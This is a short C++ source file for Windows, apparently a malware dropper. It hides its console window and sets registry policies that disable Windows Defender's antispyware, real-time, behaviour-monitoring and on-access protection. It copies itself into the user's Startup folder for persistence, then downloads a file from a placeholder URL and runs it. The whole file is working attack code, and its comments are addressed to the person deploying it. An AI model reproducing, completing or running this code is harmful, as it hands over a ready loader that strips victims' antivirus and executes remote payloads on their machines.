#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <Windows.h>
#include <tchar.h>
#include <urlmon.h>
#include <lmcons.h>

#pragma comment (lib, "urlmon.lib")

using namespace std;

int main() {

	// Making the executable hidden
	HWND executable = GetConsoleWindow();
	ShowWindow(executable, SW_HIDE);


	// Disabling Windows - if you want to use this, you need to run the executable as administrator
	HKEY hkey;
	DWORD disable = 0x00000001; // if you want to enable Windows Defender again change the value from 0x00000001 to 0x00000000

	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows Defender"), &hkey);
	RegSetValueEx(hkey, TEXT("DisableAntiSpyware"), 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
	RegCloseKey(hkey);

	RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"), &hkey);
	RegSetValueEx(hkey, TEXT("DisableScanOnRealtimeEnable"), 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
	RegSetValueEx(hkey, TEXT("DisableBehaviorMonitoring"), 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
	RegSetValueEx(hkey, TEXT("DisableOnAccessProtection"), 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
	RegCloseKey(hkey);

	Sleep(5000);

	// Copying the .exe to the startup folder (shell:startup)
	CopyFile(TEXT(".exe location"), TEXT("C:\\Users\\YOUR USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.exe"), TRUE);

	// Downloading the file
	TCHAR url[] = TEXT("LINK TO DOWNLOAD THE FILE");
	TCHAR path[MAX_PATH];

	GetCurrentDirectory(MAX_PATH, path);
	wsprintf(path, TEXT("%s\\DOWNLOADED FILE NAME"), path);
	URLDownloadToFile(NULL, url, path, 0, NULL);

	// Running the file
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION processinfo;

	ZeroMemory(&startupinfo, sizeof(startupinfo));
	startupinfo.cb = sizeof(startupinfo);
	ZeroMemory(&processinfo, sizeof(processinfo));

	CreateProcess(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupinfo, &processinfo);

	return 0;
}